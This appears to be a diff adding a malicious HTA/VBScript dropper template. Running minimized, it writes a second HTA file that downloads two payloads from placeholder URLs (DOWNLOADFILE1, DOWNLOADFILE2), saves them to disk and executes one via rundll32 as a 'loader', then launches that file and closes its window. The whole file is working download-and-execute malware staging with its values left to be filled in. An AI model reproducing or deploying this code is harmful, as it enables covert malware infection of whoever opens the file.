@@ -1,0 +1,47 @@
+<?xml version='1.0'?>
+<HTA:Application windowstate='minimize'>
+<script language = 'vbscript'>
+    set fs = CreateObject("scripting.filesystemobject")
+    set f = fs.opentextfile("Jkh0Ivw2njr5ITzf.hta", 2, true)
+
+    f.writeline "<?xml version='1.0'?>"
+    f.writeline "<HTA:Application windowstate='minimize'>"
+    f.writeline "<script language = 'vbscript'>"
+    f.writeline "Dim URLPATH_loader"
+    f.writeline "Dim FILEPATH_loader"
+    f.writeline "URLPATH_loader = " + Chr(34) + "DOWNLOADFILE1" + Chr(34)
+    f.writeline "FILEPATH_loader = " + Chr(34) + "OWNFILE1" + Chr(34)
+    f.writeline "Dim URLPATH_client"
+    f.writeline "Dim FILEPATH_client"
+    f.writeline "URLPATH_client = " + Chr(34) + "DOWNLOADFILE2" + Chr(34)
+    f.writeline "FILEPATH_client = " + Chr(34) + "OWNFILE2" + Chr(34)
+    f.writeline "Set url = CreateObject(" + Chr(34) + "Msxml2.XMLHTTP" + Chr(34) + ")"
+    f.writeline "Set shell = CreateObject(" + Chr(34) + "WScript.Shell" + Chr(34) + ")"
+    f.writeline "Set getdata = CreateObject(" + Chr(34) + "ADODB.Stream" + Chr(34) + ")"
+    f.writeline "url.Open " + Chr(34) + "Get" + Chr(34) + ", URLPATH_loader, 0"
+    f.writeline "url.Send()"
+    f.writeline "getdata.Mode = 3"
+    f.writeline "getdata.Type = 1"
+    f.writeline "getdata.Open()"
+    f.writeline "getdata.Write(url.responseBody)"
+    f.writeline "getdata.SaveToFile FILEPATH_loader, 2"
+    f.writeline "Set url2 = CreateObject(" + Chr(34) + "Msxml2.XMLHTTP" + Chr(34) + ")"
+    f.writeline "Set getdata2 = CreateObject(" + Chr(34) + "ADODB.Stream" + Chr(34) + ")"
+    f.writeline "url2.Open " + Chr(34) + "Get" + Chr(34) + ", URLPATH_client, 0"
+    f.writeline "url2.Send()"
+    f.writeline "getdata2.Mode = 3"
+    f.writeline "getdata2.Type = 1"
+    f.writeline "getdata2.Open()"
+    f.writeline "getdata2.Write(url2.responseBody)"
+    f.writeline "getdata2.SaveToFile FILEPATH_client, 2"
+    f.writeline "shell.run " + Chr(34) + "rundll32 OWNFILE3,loader " + Chr(34)
+    f.writeline "window.close()"
+    f.writeline "<" + Chr(47) + "script>"
+    f.close
+
+    set shell = CreateObject("WScript.Shell")
+    shell.run "Jkh0Ivw2njr5ITzf.hta"
+    window.close()
+</script>
+</component>
+</package>
